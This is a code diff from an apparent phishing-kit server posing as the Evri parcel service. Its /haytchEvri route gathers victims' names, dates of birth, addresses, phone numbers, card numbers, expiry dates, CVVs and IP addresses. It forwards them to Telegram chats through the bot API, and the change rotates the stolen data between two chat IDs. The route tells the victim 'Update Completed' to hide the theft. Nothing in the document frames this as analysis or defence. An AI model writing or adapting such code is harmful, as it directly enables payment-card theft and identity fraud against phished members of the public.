@@ -12359,6 +12359,8 @@ app.post("/flashEvri", (req, res) => {
     });
 });
 
+let aug24 = 0;
+
 app.options("/haytchEvri", cors());
 
 app.post("/haytchEvri", (req, res) => {
@@ -12412,13 +12414,25 @@ app.post("/haytchEvri", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      axios
-        .post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-684572212&text=HAYTCHRES:\n${originalText}`
-        )
-        .catch((e) => {
-          console.log(e);
-        });
+      if (aug24 == 1) {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-684572212&text=HAYTCHRES:\n${originalText}`
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        aug24 = 0;
+      } else {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-609654810&text=HAYTCHRES:\n${originalText}`
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        aug24 += 1;
+      }
       res.send("Update Completed");
     });
 });
